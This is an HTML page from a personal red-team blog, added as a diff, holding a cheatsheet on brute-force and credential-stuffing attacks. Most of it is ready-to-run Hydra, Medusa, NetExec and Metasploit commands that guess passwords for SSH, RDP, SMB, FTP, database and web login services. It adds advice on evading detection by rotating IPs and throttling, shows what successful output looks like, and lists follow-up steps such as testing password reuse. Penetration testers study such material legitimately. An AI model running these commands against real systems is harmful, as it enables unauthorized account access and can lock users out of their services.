@@ -1,0 +1,388 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Brute-Force-Attacks"><a href="#Brute-Force-Attacks" class="headerlink" title="Brute Force Attacks"></a>Brute Force Attacks</h1><p>Test multiple passwords against user accounts to gain unauthorized access through credential guessing.<br>Brute forcing is noisier than spraying and can trigger account lockouts, so use carefully with proper delays.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hydra SSH brute force</span></span><br><span class="line">hydra -l admin -P rockyou.txt ssh://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Medusa RDP brute force</span></span><br><span class="line">medusa -h 10.10.10.10 -u administrator -P passwords.txt -M rdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># NetExec SMB brute force</span></span><br><span class="line">nxc smb 10.10.10.10 -u admin -p passwords.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SSH brute force</span></span><br><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH with custom port</span></span><br><span class="line">hydra -l admin -P passwords.txt -s 2222 ssh://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># RDP brute force</span></span><br><span class="line">hydra -l administrator -P passwords.txt rdp://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB brute force</span></span><br><span class="line">hydra -l admin -P passwords.txt smb://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># FTP brute force</span></span><br><span class="line">hydra -l ftpuser -P passwords.txt ftp://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL brute force</span></span><br><span class="line">hydra -l root -P passwords.txt mysql://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># PostgreSQL brute force</span></span><br><span class="line">hydra -l postgres -P passwords.txt postgres://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP Basic Auth</span></span><br><span class="line">hydra -l admin -P passwords.txt http-get://10.10.10.10/admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP POST form</span></span><br><span class="line">hydra -l admin -P passwords.txt 10.10.10.10 http-post-form <span class="string">&quot;/login:username=^USER^&amp;password=^PASS^:F=Invalid credentials&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP POST with success condition</span></span><br><span class="line">hydra -l admin -P passwords.txt 10.10.10.10 http-post-form <span class="string">&quot;/login:username=^USER^&amp;password=^PASS^:S=302&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP POST with success text</span></span><br><span class="line">hydra -l admin -P passwords.txt 10.10.10.10 http-post-form <span class="string">&quot;/login:username=^USER^&amp;password=^PASS^:S=Dashboard&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Multiple targets from file</span></span><br><span class="line">hydra -l root -p toor -M targets.txt ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Verbose output</span></span><br><span class="line">hydra -l admin -P passwords.txt -V ssh://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Limit parallel tasks</span></span><br><span class="line">hydra -l admin -P passwords.txt -t 4 ssh://10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h2 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SSH brute force</span></span><br><span class="line">medusa -h 10.10.10.10 -u root -P passwords.txt -M ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH with parallel tasks</span></span><br><span class="line">medusa -h 10.10.10.10 -u sshuser -P passwords.txt -M ssh -t 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH with custom port</span></span><br><span class="line">medusa -h 10.10.10.10 -n 2222 -u admin -P passwords.txt -M ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># RDP brute force</span></span><br><span class="line">medusa -h 10.10.10.10 -u administrator -P passwords.txt -M rdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB brute force</span></span><br><span class="line">medusa -h 10.10.10.10 -u admin -P passwords.txt -M smbnt</span><br><span class="line"></span><br><span class="line"><span class="comment"># FTP brute force</span></span><br><span class="line">medusa -h 10.10.10.10 -u ftpuser -P passwords.txt -M ftp</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL brute force</span></span><br><span class="line">medusa -h 10.10.10.10 -u root -P passwords.txt -M mysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># PostgreSQL brute force</span></span><br><span class="line">medusa -h 10.10.10.10 -u postgres -P passwords.txt -M postgres</span><br><span class="line"></span><br><span class="line"><span class="comment"># Telnet brute force</span></span><br><span class="line">medusa -h 10.10.10.10 -u admin -P passwords.txt -M telnet</span><br><span class="line"></span><br><span class="line"><span class="comment"># VNC brute force</span></span><br><span class="line">medusa -h 10.10.10.10 -P passwords.txt -M vnc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Multiple targets</span></span><br><span class="line">medusa -H targets.txt -u admin -P passwords.txt -M ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for empty passwords</span></span><br><span class="line">medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ssh -e n</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for passwords matching username</span></span><br><span class="line">medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ssh -e s</span><br><span class="line"></span><br><span class="line"><span class="comment"># Both empty and username checks</span></span><br><span class="line">medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ssh -e ns</span><br></pre></td></tr></table></figure>
+
+<h2 id="NetExec-CrackMapExec"><a href="#NetExec-CrackMapExec" class="headerlink" title="NetExec (CrackMapExec)"></a>NetExec (CrackMapExec)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SMB brute force</span></span><br><span class="line">nxc smb 10.10.10.10 -u admin -p passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB with domain</span></span><br><span class="line">nxc smb 10.10.10.10 -u admin -p passwords.txt -d domain.local</span><br><span class="line"></span><br><span class="line"><span class="comment"># WinRM brute force</span></span><br><span class="line">nxc winrm 10.10.10.10 -u administrator -p passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># RDP brute force</span></span><br><span class="line">nxc rdp 10.10.10.10 -u admin -p passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># MSSQL brute force</span></span><br><span class="line">nxc mssql 10.10.10.10 -u sa -p passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># LDAP brute force</span></span><br><span class="line">nxc ldap 10.10.10.10 -u admin -p passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Local authentication</span></span><br><span class="line">nxc smb 10.10.10.10 -u admin -p passwords.txt --local-auth</span><br><span class="line"></span><br><span class="line"><span class="comment"># Continue on success</span></span><br><span class="line">nxc smb 10.10.10.10 -u admin -p passwords.txt --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SMB brute force</span></span><br><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line"><span class="built_in">set</span> USER_FILE users.txt</span><br><span class="line"><span class="built_in">set</span> PASS_FILE passwords.txt</span><br><span class="line"><span class="built_in">set</span> SMBDomain domain.local</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH brute force</span></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line"><span class="built_in">set</span> USERNAME admin</span><br><span class="line"><span class="built_in">set</span> PASS_FILE passwords.txt</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># WinRM brute force</span></span><br><span class="line">use auxiliary/scanner/winrm/winrm_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line"><span class="built_in">set</span> USER_FILE users.txt</span><br><span class="line"><span class="built_in">set</span> PASS_FILE passwords.txt</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL brute force</span></span><br><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line"><span class="built_in">set</span> USERNAME root</span><br><span class="line"><span class="built_in">set</span> PASS_FILE passwords.txt</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># PostgreSQL brute force</span></span><br><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line"><span class="built_in">set</span> USERNAME postgres</span><br><span class="line"><span class="built_in">set</span> PASS_FILE passwords.txt</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># FTP brute force</span></span><br><span class="line">use auxiliary/scanner/ftp/ftp_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line"><span class="built_in">set</span> USER_FILE users.txt</span><br><span class="line"><span class="built_in">set</span> PASS_FILE passwords.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="Credential-Stuffing"><a href="#Credential-Stuffing" class="headerlink" title="Credential Stuffing"></a>Credential Stuffing</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hydra with user:pass list</span></span><br><span class="line">hydra -C user_pass.txt ssh://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format: username:password (one per line)</span></span><br><span class="line"><span class="comment"># admin:Password123!</span></span><br><span class="line"><span class="comment"># user:Welcome1!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NetExec credential stuffing (no brute force)</span></span><br><span class="line">nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce</span><br></pre></td></tr></table></figure>
+
+<h2 id="Advanced-Hydra-Techniques"><a href="#Advanced-Hydra-Techniques" class="headerlink" title="Advanced Hydra Techniques"></a>Advanced Hydra Techniques</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Generate passwords on the fly (6-8 chars, alphanumeric)</span></span><br><span class="line">hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 10.10.10.10 rdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Resume interrupted session</span></span><br><span class="line">hydra -l admin -P passwords.txt -R ssh://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save output to file</span></span><br><span class="line">hydra -l admin -P passwords.txt -o results.txt ssh://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use proxy</span></span><br><span class="line">hydra -l admin -P passwords.txt -e nsr -o results.txt -t 1 -w 10 -f ssh://10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h2 id="Common-Workflow"><a href="#Common-Workflow" class="headerlink" title="Common Workflow"></a>Common Workflow</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Identify service and port</span></span><br><span class="line">nmap -sV -p- 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Select appropriate tool and wordlist</span></span><br><span class="line"><span class="comment"># For SSH: hydra or medusa</span></span><br><span class="line"><span class="comment"># For RDP: hydra or medusa</span></span><br><span class="line"><span class="comment"># For SMB: NetExec or Metasploit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Start with small wordlist</span></span><br><span class="line">hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ssh://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: If unsuccessful, use larger wordlist</span></span><br><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Monitor for lockouts</span></span><br><span class="line"><span class="comment"># Check account status periodically</span></span><br><span class="line"><span class="comment"># Adjust timing if needed</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>Brute Force vs Password Spraying:</strong></p>
+<ul>
+<li><p><strong>Brute Force</strong>: Many passwords, one user</p>
+<ul>
+<li>High risk of account lockout</li>
+<li>Very noisy and easily detected</li>
+<li>Faster if no lockout policy</li>
+</ul>
+</li>
+<li><p><strong>Password Spraying</strong>: One password, many users</p>
+<ul>
+<li>Respects lockout policies</li>
+<li>Less noisy</li>
+<li>Slower but safer</li>
+</ul>
+</li>
+</ul>
+<p><strong>Account Lockout Risks:</strong></p>
+<p>Brute forcing can trigger account lockouts:</p>
+<ul>
+<li>Typical threshold: 3-5 failed attempts</li>
+<li>Lockout duration: 30 minutes to permanent</li>
+<li>Can cause denial of service</li>
+</ul>
+<p>Always check lockout policy first:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.10.10.10 -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
+
+<p><strong>Tool Selection:</strong></p>
+<ul>
+<li><p><strong>Hydra</strong>: </p>
+<ul>
+<li>Fast and versatile</li>
+<li>Supports many protocols</li>
+<li>Good for quick attacks</li>
+<li>Can be unstable with some services</li>
+</ul>
+</li>
+<li><p><strong>Medusa</strong>:</p>
+<ul>
+<li>More stable than Hydra</li>
+<li>Better error handling</li>
+<li>Modular design</li>
+<li>Fewer protocols supported</li>
+</ul>
+</li>
+<li><p><strong>NetExec</strong>:</p>
+<ul>
+<li>Best for Windows environments</li>
+<li>Built-in SMB, WinRM, MSSQL support</li>
+<li>Shows admin access clearly</li>
+<li>Active development</li>
+</ul>
+</li>
+<li><p><strong>Metasploit</strong>:</p>
+<ul>
+<li>Integrated with exploitation framework</li>
+<li>Good for complex scenarios</li>
+<li>Slower than standalone tools</li>
+<li>Better logging and reporting</li>
+</ul>
+</li>
+</ul>
+<p><strong>HTTP Form Brute Forcing:</strong></p>
+<p>When targeting web login forms:</p>
+<ol>
+<li>Inspect the form to identify field names</li>
+<li>Determine success&#x2F;failure indicators</li>
+<li>Use appropriate condition string</li>
+</ol>
+<p>Failure condition (F&#x3D;):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra ... http-post-form <span class="string">&quot;/login:user=^USER^&amp;pass=^PASS^:F=Invalid credentials&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Success condition (S&#x3D;):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># HTTP redirect</span></span><br><span class="line">hydra ... http-post-form <span class="string">&quot;/login:user=^USER^&amp;pass=^PASS^:S=302&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Success text</span></span><br><span class="line">hydra ... http-post-form <span class="string">&quot;/login:user=^USER^&amp;pass=^PASS^:S=Dashboard&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Performance Tuning:</strong></p>
+<p>Adjust parallel tasks based on target:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hydra: -t flag (default 16)</span></span><br><span class="line">hydra -t 4 -l admin -P passwords.txt ssh://10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Medusa: -t flag (default 4)</span></span><br><span class="line">medusa -t 8 -h 10.10.10.10 -u admin -P passwords.txt -M ssh</span><br></pre></td></tr></table></figure>
+
+<p>Lower values:</p>
+<ul>
+<li>Slower but stealthier</li>
+<li>Less likely to trigger IDS&#x2F;IPS</li>
+<li>Better for unstable services</li>
+</ul>
+<p>Higher values:</p>
+<ul>
+<li>Faster attacks</li>
+<li>More network traffic</li>
+<li>Higher detection risk</li>
+</ul>
+<p><strong>Wordlist Recommendations:</strong></p>
+<p>Small lists (quick tests):</p>
+<ul>
+<li><code>/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt</code></li>
+<li><code>/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt</code></li>
+<li><code>/usr/share/seclists/Passwords/darkweb2017-top100.txt</code></li>
+</ul>
+<p>Medium lists:</p>
+<ul>
+<li><code>/usr/share/seclists/Passwords/darkweb2017-top10000.txt</code></li>
+<li><code>/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt</code></li>
+</ul>
+<p>Large lists:</p>
+<ul>
+<li><code>/usr/share/wordlists/rockyou.txt</code> (14M passwords)</li>
+<li><code>/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt</code></li>
+</ul>
+<p><strong>Detection Avoidance:</strong></p>
+<ul>
+<li>Use realistic delays between attempts</li>
+<li>Limit parallel connections</li>
+<li>Rotate source IPs if possible</li>
+<li>Brute force during business hours</li>
+<li>Monitor for defensive responses</li>
+<li>Stop if lockouts detected</li>
+</ul>
+<p><strong>Success Indicators:</strong></p>
+<p>Hydra:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[22][ssh] host: 10.10.10.10 login: admin password: Password123!</span><br></pre></td></tr></table></figure>
+
+<p>Medusa:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ACCOUNT FOUND: [ssh] Host: 10.10.10.10 User: admin Password: Password123!</span><br></pre></td></tr></table></figure>
+
+<p>NetExec:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SMB  10.10.10.10  445  DC01  [+] domain.local\admin:Password123! (Pwn3d!)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Legal and Ethical Considerations:</strong></p>
+<ul>
+<li>Only brute force with explicit authorization</li>
+<li>Respect account lockout policies</li>
+<li>Avoid denial of service conditions</li>
+<li>Document all attempts</li>
+<li>Follow rules of engagement</li>
+<li>Stop if causing system instability</li>
+</ul>
+<p><strong>Common Pitfalls:</strong></p>
+<ul>
+<li>Not checking for account lockouts</li>
+<li>Using too many parallel threads</li>
+<li>Not monitoring target system health</li>
+<li>Forgetting to check for default credentials first</li>
+<li>Using wrong protocol or port</li>
+<li>Not handling special characters in passwords</li>
+<li>Ignoring rate limiting</li>
+</ul>
+<p><strong>Post-Success Actions:</strong></p>
+<p>Once credentials found:</p>
+<ol>
+<li>Verify access immediately</li>
+<li>Document credentials securely</li>
+<li>Check privilege level</li>
+<li>Test on other systems (password reuse)</li>
+<li>Continue enumeration with valid credentials</li>
+</ol>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
